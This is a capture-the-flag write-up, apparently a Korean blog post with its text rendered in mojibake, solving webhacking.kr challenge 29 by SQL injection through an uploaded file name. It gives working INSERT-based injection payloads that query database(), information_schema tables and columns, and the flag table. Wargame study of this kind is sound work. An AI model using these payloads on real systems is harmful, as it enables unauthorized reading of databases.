---
title: "[webhacking.kr] 29ë²ˆ ë¬¸ì œ í’€ì´[SQL injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
toc: true
toc_sticky: true
toc_label: "29ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ğŸ’¡ Webhacking.kr challenge(old) 29ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
  ![image](https://user-images.githubusercontent.com/33647663/152376271-c40187e8-df65-4923-8541-15f0fa82f908.png)

  íŒŒì¼ì„ ì—…ë¡œë“œ í•˜ì—¬ ë‹¤ë¥¸ í…Œì´ë¸”ì— ìˆëŠ” flagë¥¼ ì½ì–´ì˜¤ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.

  íŒŒì¼ì„ ì—…ë¡œë“œë¥¼ í•˜ë©´ ë‹¤ìŒì˜ ì •ë³´ë“¤ì´ ì €ì¥ë˜ê³  í™”ë©´ì— ì¶œë ¥ë©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/152376489-3a2400f1-8470-4b65-8442-29e050e4f0d0.png)

# ë¬¸ì œ í’€ì´
  í™”ë©´ì— í‘œì‹œë˜ëŠ” ì •ë³´ë“¤ì„ ë´¤ì„ ë•Œ DBì—ëŠ” íŒŒì¼ì´ ì—…ë¡œë“œëœ ì‹œê°„, ë‚˜ì˜ IP, ì—…ë¡œë“œëœ íŒŒì¼ëª…ì´ ì €ì¥ì´ ë©ë‹ˆë‹¤. ì‹¤ì œ í•´ë‹¹ ì •ë³´ë“¤ì´ DBì— ë“¤ì–´ê°ˆ ì¿¼ë¦¬ë¬¸ì„ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±ë˜ì–´ ìˆì„ ê²ƒì…ë‹ˆë‹¤.

  ```sql
  insert into chall29(time,ip,file) values (123,'ë‚´ip','íŒŒì¼ëª…')
  ``` 

  ìœ„ì˜ ì •ë³´ë“¤ ì¤‘ì—ì„œ íŒŒì¼ëª… ë¶€ë¶„ì€ ì¡°ì‘ì´ ê°€ëŠ¥í•˜ê¸° ë•Œë¬¸ì— ì´ë¥¼ ì´ìš©í•´ì„œ ì¸ì ì…˜ ê³µê²©ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 

  ì´ë•Œ insert into chall29 ë¬¸ì—ì„œ **(time,ip,file)** ì»¬ëŸ¼ë“¤ì˜ ìˆœì„œë¥¼ ëª¨ë‘ ê³ ë ¤í•´ì„œ ì¸ì ì…˜ì„ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ê°€ëŠ¥í•œ ê²½ìš°ì˜ ìˆ˜ëŠ” ì´ 6ê°€ì§€ë¡œ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  1. time,ip,file
  2. time,file,ip
  3. ip,time,file
  4. ip,file,time
  5. file,ip,time
  6. file,time,ip

  ë§Œì•½ 1ë²ˆì˜ ìˆœì„œë¡œ insert into ë¬¸ì´ ì‘ì„±ë˜ì–´ ìˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ injectionì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  íŒŒì¼ ëª… : ```test1'),(123,'ë‚´ip','test2```
  
  ìœ„ì˜ íŒŒì¼ëª…ì´ ì¸ì ì…˜ ë˜ì—ˆì„ë•Œ sqlë¬¸ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  ```sql
  insert into chall29(time,ip,file) values (123,'ë‚´ip','test1'),(123,'ë‚´ip','test2')
  ```

  ìœ„ì˜ ì¼€ì´ìŠ¤ë¥¼ ì‹œë„í•´ ë´¤ì„ë•Œ, ê³µê²©ì´ ì„±ê³µí•œ ê²ƒì€ 6ë²ˆ ì¼€ì´ìŠ¤ ì˜€ìœ¼ë©° ë‹¤ìŒê³¼ ê°™ì€ íŒŒì¼ëª…ìœ¼ë¡œ ì—…ë¡œë“œ í•˜ì˜€ì„ë•Œ í•œë²ˆì— **test1**íŒŒì¼ê³¼, **test2**íŒŒì¼ì´ ì—…ë¡œë“œ ë˜ì—ˆìŠµë‹ˆë‹¤.

  ```md
  test1',123,'58.122.121.25'),('test2
  ```

  ![image](https://user-images.githubusercontent.com/33647663/152526741-3cca21a5-54db-4d55-b232-a6ef542bb546.png)

  ì´ì œ test2 ëŒ€ì‹ ì— ì›í•˜ëŠ” ì •ë³´ë¥¼ ë½‘ì•„ ì˜¬ ìˆ˜ ìˆëŠ” ì¿¼ë¦¬ë¥¼ ì‘ì„±í•˜ì—¬ ë°ì´í„°ë¥¼ ì½ì–´ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  ë‹¤ë¥¸ í…Œì´ë¸”ì— ìˆëŠ” ë°ì´í„°ë¥¼ ì½ì–´ì™€ì•¼ í•˜ë¯€ë¡œ, ë‹¤ìŒì˜ ê³¼ì •ì„ í†µí•´ì„œ ë°ì´í„°ë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.

  - DB ëª… ì•Œì•„ë‚´ê¸° -> database() ì´ìš©
  - tableëª… ì•Œì•„ë‚´ê¸° -> information_schema.tablesì´ìš©
  - columnëª… ì•Œì•„ë‚´ê¸° -> information_schema.columnsì´ìš©
  - ë°ì´í„° ì•Œì•„ë‚´ê¸° -> select [column_name] from [table_name] ì´ìš©
  
  ìœ„ì˜ ìˆœì„œëŒ€ë¡œ ë°ì´í„°ë¥¼ ë½‘ì•„ëƒ…ë‹ˆë‹¤. ë°ì´í„°ë¥¼ ë½‘ì•„ë‚´ê¸° ìœ„í•´ ì‚¬ìš©í•œ íŒŒì¼ ëª…ë“¤ì€ ë‹¤ìŒê³¼ ê°™ìœ¼ë©° ì—…ë¡œë“œì‹œ ë‹¤ìŒê³¼ ê°™ì´ ì°¨ë¡€ëŒ€ë¡œ ë°ì´í„°ë¥¼ ë½‘ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  - DB ì´ë¦„
  >  íŒŒì¼ëª… : ```1',1,'1'),(database(),1,'58.122.121.25')#```
  > ![image](https://user-images.githubusercontent.com/33647663/152528480-491ff65a-9a33-4775-94f2-7275a3a9cd58.png)

  - table ì´ë¦„
  > **ì£¼ì˜**<br>
  í•´ë‹¹ DBì— í…Œì´ë¸”ì´ ì—¬ëŸ¬ê°œ ìˆìœ¼ë¯€ë¡œ limit ì„ ì´ìš©í•´ì„œ í•˜ë‚˜ì”© í…Œì´ë¸” ëª…ì„ ë½‘ì•„ë´ì•¼ í•©ë‹ˆë‹¤.<br><br>
  > íŒŒì¼ëª… : ```1',1,'1'),((select table_name from information_schema.tables where table_schema='chall29' limit 0,1),1,'58.122.121.25')#```<br>
  > ![image](https://user-images.githubusercontent.com/33647663/152528957-d867196c-c42e-48c2-8c9e-d67dba838ee3.png)<br><br>
  > íŒŒì¼ëª… : ```1',1,'1'),((select table_name from information_schema.tables where table_schema='chall29' limit 1,1),1,'58.122.121.25')#```<br>
  > ![image](https://user-images.githubusercontent.com/33647663/152530022-29f7be81-b81f-4170-8636-77e7321a7552.png)
  

  - column ì´ë¦„
  > **ì£¼ì˜**<br>
  ì»¬ëŸ¼ ëª…ë„ í•˜ë‚˜ì˜ í…Œì´ë¸”ì— ì—¬ëŸ¬ê°œì˜ ì»¬ëŸ¼ì´ ìˆì„ ê°€ëŠ¥ì„±ì´ ìˆìœ¼ë¯€ë¡œ, limit ì„ ì´ìš©í•´ì„œ í•˜ë‚˜ì”© ë½‘ì•„ì™€ì•¼ í•©ë‹ˆë‹¤.<br><br>
  > íŒŒì¼ëª… : ```1',1,'1'),((select column_name from information_schema.columns where table_name='flag_congratz' limit 0,1),1,'58.122.121.25')#```<br>
  > ![image](https://user-images.githubusercontent.com/33647663/152531208-64665411-dc64-46c2-a41f-628312522299.png)


  - ë°ì´í„°
  > íŒŒì¼ëª… : ```1',1,'1'),((select flag from flag_congratz limit 0,1),1,'58.122.121.25')#```
  > ![image](https://user-images.githubusercontent.com/33647663/152531406-15f94dc8-3ab0-46a3-8e53-aa417a3b8a24.png)

  
# ê²°ê³¼
  ìœ„ì˜ ë°©ë²•ëŒ€ë¡œ ìˆœì„œëŒ€ë¡œ í’€ì—ˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ í”Œë˜ê·¸ë¥¼ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
  
  ![image](https://user-images.githubusercontent.com/33647663/152531576-9cddbeec-91e7-4296-86ab-0db0087de64e.png)


